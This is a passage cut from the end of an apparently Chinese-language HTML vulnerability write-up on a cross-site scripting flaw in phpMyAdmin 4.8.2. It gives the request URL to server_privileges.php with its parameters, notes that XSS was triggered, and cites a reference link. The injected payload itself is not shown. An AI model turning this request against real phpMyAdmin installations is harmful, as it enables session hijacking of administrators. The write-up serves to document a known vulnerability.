class="cs5BEC2C28">http://www.0-sec.org/phpMyAdmin-4.8.2/server_privileges.php?change_copy=aa&amp;old_username=test&amp;old_hostname=127.0.0.1&amp;mode=5</span><span class="cs8926E06"><br/>3.png<br/></span><span class="cs9C1B1871">成功触发</span><span class="cs8926E06">XSS</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7797</span></p></body>
</html>
